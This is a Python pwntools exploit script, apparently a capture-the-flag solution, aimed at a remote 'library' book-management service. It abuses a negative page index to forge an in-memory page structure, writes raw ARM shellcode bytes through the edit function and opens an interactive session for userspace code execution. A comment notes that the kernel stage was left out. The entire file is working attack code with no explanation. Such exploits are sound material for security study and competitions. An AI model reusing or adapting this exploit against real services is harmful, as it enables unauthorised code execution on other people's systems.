#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time

#host = "10.211.55.28"
host = "54.214.122.246"
port = 8888

r = remote(host,port)

def enterlib():
    r.recvuntil("$")
    r.sendline("library")

def addbook(title,numpage,font=None,content=None):
    r.recvuntil("$")
    r.sendline("add")
    r.recvuntil(":")
    r.sendline(title)
    r.recvuntil(":")
    r.sendline(str(numpage))
    if numpage > 0 :
        r.recvuntil(":")
        r.sendline(font)
        r.recvuntil(":")
        r.sendline(content)

def editbookpage(idx,pageid,font,content):
    r.recvuntil("$")
    r.sendline("edit")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil("x - Tare a page")
    r.sendline("p")
    r.recvuntil(":")
    r.sendline(str(pageid))
    r.recvuntil(":")
    r.sendline(font)
    r.recvuntil(":")
    r.sendline(content)

# It can execute any code in userspace 
# The kernel part is solved by my teammate,sean. So I can't public the part .

enterlib()
addbook("ddaa",0)
editbookpage(0,-1,p32(0x6400c38) + p32(0x44009ac) + "phd", "phd") # forge a page struct .
editbookpage(0,777,"nogg","\x04\x41\x9f\xe5\x01\x1a\xa0\xe3\x10\xff\x2f\xe1\x4c\xf4\x40\x04")
r.sendline("\x04\x41\x9f\xe5\x01\x1a\xa0\xe3\x10\xff\x2f\xe1\x4c\xf4\x40\x04")
editbookpage(0,777,"nogg","\x04")
time.sleep(0.1)
r.sendline("\x04")
r.sendline("list")
time.sleep(0.1)
sc = "aaaa" 
r.sendline(sc)

r.interactive()
